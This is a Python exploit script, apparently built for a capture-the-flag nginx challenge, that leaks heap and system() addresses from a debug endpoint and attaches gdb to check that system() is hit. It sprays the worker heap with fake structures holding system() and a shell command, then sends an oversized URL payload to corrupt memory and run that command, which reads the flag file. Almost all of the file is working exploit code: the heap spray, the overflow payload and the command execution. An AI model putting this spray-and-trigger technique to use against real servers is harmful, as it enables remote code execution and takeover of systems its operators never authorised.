#!/usr/bin/env python3
"""Definitive: attach gdb breakpoint on system(), run stock exploit.py values,
capture whether system() is hit and rdi value.

Admin-only proof: shows system() is genuinely reached (not just a crash),
with the exact command string and backtrace. Requires Docker access.
"""
import socket, struct, time, subprocess, re, sys

CONTAINER = "ctf-nginx-rift"
HOST = "172.17.0.1"
PORT = 19321
BODY_LEN = 4000
N_SPRAY = 20
CMD = "cat /flag.txt > /tmp/rift_flag.txt"
# stock exploit.py values
A = 348
PLUS = 964
OFFSETS = [0x85157, 0xd3257]  # candidate offsets (URL-safe)


def sh(*a, timeout=90):
    return subprocess.run(list(a), capture_output=True, text=True, timeout=timeout)


def dexec(code, shell=False):
    a = ["docker", "exec", CONTAINER]
    a += ["sh", "-lc", code] if shell else ["python3", "-c", code]
    r = sh(*a)
    return (r.stdout + (("\n--STDERR--\n" + r.stderr) if r.returncode else ""))


def http_get(path):
    try:
        with socket.create_connection((HOST, PORT), timeout=5) as s:
            s.sendall(f"GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n".encode())
            out = b""
            while True:
                d = s.recv(65536)
                if not d: break
                out += d
            return out
    except Exception:
        return b""


def leak():
    b = http_get("/debug").split(b"\r\n\r\n", 1)[-1].decode()
    heap = int(re.search(r"worker_heap_base\s*:\s*(0x[0-9a-fA-F]+)", b).group(1), 16)
    system = int(re.search(r"system_addr\s*:\s*(0x[0-9a-fA-F]+)", b).group(1), 16)
    return heap, system


def wait_alive(tries=30):
    for _ in range(tries):
        try:
            if b"HTTP/" in http_get("/"): return True
        except Exception:
            time.sleep(1)
    return False


def main():
    sh("docker", "restart", CONTAINER)
    time.sleep(3)
    if not wait_alive(): print("not alive"); return 1
    heap, system = leak()

    # get worker pid from /debug
    dbg = http_get("/debug").decode(errors="replace")
    pid = re.search(r"nginx_pid\s*:\s*(\d+)", dbg).group(1)
    print(f"[+] pid={pid} heap={hex(heap)} system={hex(system)}")

    # attach gdb breakpoint on system()
    gdb = f"""set pagination off
set confirm off
set logging file /tmp/hit.log
set logging overwrite on
set logging enabled on
break *{hex(system)}
commands
silent
printf "=== HIT system() rdi=%p ===\\n", $rdi
x/s $rdi
bt
continue
end
handle SIGSEGV stop print
handle SIGPIPE nostop noprint
continue
"""
    dexec(f"cat > /tmp/g.cmd <<'EOF'\n{gdb}\nEOF\necho ok", shell=True)
    dexec(f"nohup gdb -p {pid} -batch -x /tmp/g.cmd > /tmp/g.out 2>&1 & echo attached", shell=True)
    time.sleep(3)
    # verify gdb attached
    print("[*] gdb status:", dexec("ps aux | grep -c '[g]db'", shell=True).strip())

    # spray
    cmd = CMD.encode() + b"\x00"
    socks = []
    for off in OFFSETS:
        t = heap + off
        body = struct.pack("<QQQ", system, t + 24, 0) + cmd
        body += b"A" * (BODY_LEN - len(body))
        for _ in range(N_SPRAY // 2):
            s = socket.create_connection((HOST, PORT), timeout=5)
            s.sendall(b"POST /spray HTTP/1.1\r\nHost: x\r\nContent-Length: "
                      + str(BODY_LEN).encode() + b"\r\nX-Delay: 60\r\nConnection: close\r\n\r\n" + body)
            socks.append(s); time.sleep(0.01)
    time.sleep(0.5)

    # trigger first candidate
    target = heap + OFFSETS[0]
    target6 = bytes([(target >> (j*8)) & 0xff for j in range(6)])
    payload = b"A"*A + b"+"*PLUS + target6
    a = socket.create_connection((HOST, PORT), timeout=5)
    a.sendall(b"GET /api/" + payload + b" HTTP/1.1\r\nHost: x\r\n")
    time.sleep(0.3)
    v = socket.create_connection((HOST, PORT), timeout=5)
    v.sendall(b"GET / HTTP/1.1\r\nHost: x\r\n")
    time.sleep(0.3)
    a.sendall(b"X-Delay: 60\r\nConnection: close\r\n\r\n")
    time.sleep(0.6)
    v.close()
    time.sleep(2.5)

    for s in socks:
        try: s.close()
        except Exception: pass

    print("[*] gdb hit log:")
    print(dexec("cat /tmp/hit.log 2>&1", shell=True))
    print("[*] gdb out:")
    print(dexec("cat /tmp/g.out 2>&1", shell=True))
    print("[*] loot:")
    print(http_get("/loot/rift_flag.txt").decode(errors="replace"))


if __name__ == "__main__":
    sys.exit(main())
